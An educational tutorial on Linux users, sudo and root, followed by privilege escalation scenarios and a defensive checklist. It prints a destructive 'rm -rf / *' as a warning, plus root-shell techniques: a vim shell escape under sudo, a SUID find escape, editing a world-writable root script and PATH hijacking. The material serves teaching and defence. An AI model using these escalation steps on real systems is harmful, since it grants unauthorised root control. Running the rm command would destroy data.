Day-27 Deep Dive: Linux Users, sudo, Root & Privilege Escalation Scenarios
1. Understanding Real-World User Contexts
Scenario 1: Normal User Environment

In most Linux systems:

Developers

Students

Employees

All operate as normal users.

Example:

whoami


Output:

virat


At this stage:

You cannot edit /etc/passwd

You cannot install system packages

You cannot change kernel settings

This limitation is intentional and protects the system.

2. Why Root Access Is Dangerous (Real Example)
Scenario 2: Accidental Damage as Root

Imagine running this as root:

rm -rf / *


ðŸ’¥ Result:

Entire system wiped

No confirmation

No undo

Thatâ€™s why Linux does not encourage logging in as root.

3. How sudo Solves This Problem

sudo provides temporary, controlled elevation.

Scenario 3: Safe Administrative Task

You want to update packages.

âŒ Unsafe:

su


(You remain root indefinitely)

âœ… Safe:

sudo apt update
sudo apt upgrade


Here:

Privileges apply only to that command

After execution â†’ you return to normal user

4. sudo Internals (Important for Security)
How sudo works:

Checks /etc/sudoers

Verifies user permission

Asks for user password

Logs the command

Executes as root

Log location:
/var/log/auth.log


This logging is critical for forensics & auditing.

5. Dangerous sudo Configurations (VERY IMPORTANT)
Scenario 4: Passwordless sudo (Risky)
virat ALL=(ALL) NOPASSWD: ALL


ðŸ”¥ Risk:

Any attacker gaining user access instantly gets root

No password barrier

Common misconfiguration in CTFs & real servers

6. Privilege Escalation via Misconfigured sudo
Scenario 5: Allowed Binary Exploitation
virat ALL=(root) /usr/bin/vim


Attacker runs:

sudo vim


Inside vim:

:! /bin/bash


ðŸ’€ Result:

Root shell obtained

Full system compromise

This is a classic privilege escalation technique.

7. File Permission Misconfiguration Scenarios
Scenario 6: Writable System Script

Permissions:

-rwxrwxrwx root root /usr/local/bin/backup.sh


Any user can edit the script:

echo "bash" >> /usr/local/bin/backup.sh


If root executes this script later â†’ attacker gets root shell.

8. SUID Bit Exploitation (Advanced)
What is SUID?

Allows execution as file owner (often root)

Check SUID files:

find / -perm -4000 2>/dev/null

Scenario 7: Vulnerable SUID Binary

If /usr/bin/find has SUID:

find . -exec /bin/sh \; -quit


ðŸ”¥ Boom:

Root shell

No sudo required

9. Environment Variable Abuse
Scenario 8: PATH Hijacking

Script run by root:

backup.sh


PATH is unsafe:

PATH=.:/usr/bin


Attacker creates:

echo "/bin/bash" > backup.sh
chmod +x backup.sh


When root runs script â†’ attacker code executes as root.

10. whoami in Privilege Escalation Validation

Attackers repeatedly use:

whoami


To verify:

Initial access

After sudo execution

After exploit success

Example:

whoami


Before:

user


After exploit:

root

11. Defensive Perspective (Blue Team)
How admins prevent escalation:

âœ” Least privilege principle
âœ” Minimal sudo access
âœ” No wildcard sudo rules
âœ” Remove unnecessary SUID binaries
âœ” Correct file permissions
âœ” Regular audits

Audit commands:

sudo -l
getcap -r / 2>/dev/null
find / -perm -4000 2>/dev/null

12. Real-World Attack Flow (End-to-End)

Attacker gains low-level user access

Runs whoami

Enumerates sudo permissions

Checks SUID binaries

Finds misconfiguration

Exploits it

Becomes root

Takes full control

13. Key Security Insight (VERY IMPORTANT)

Linux itself is secure.
Misconfiguration is the real vulnerability.

Most privilege escalation happens due to:

Human error

Poor permission management

Overuse of sudo

14. Final Takeaway

Understanding users, sudo, and root is not optional for:

Ethical Hackers

System Administrators

Cybersecurity Engineers

Linux Developers

Privilege separation is the foundation of Linux security.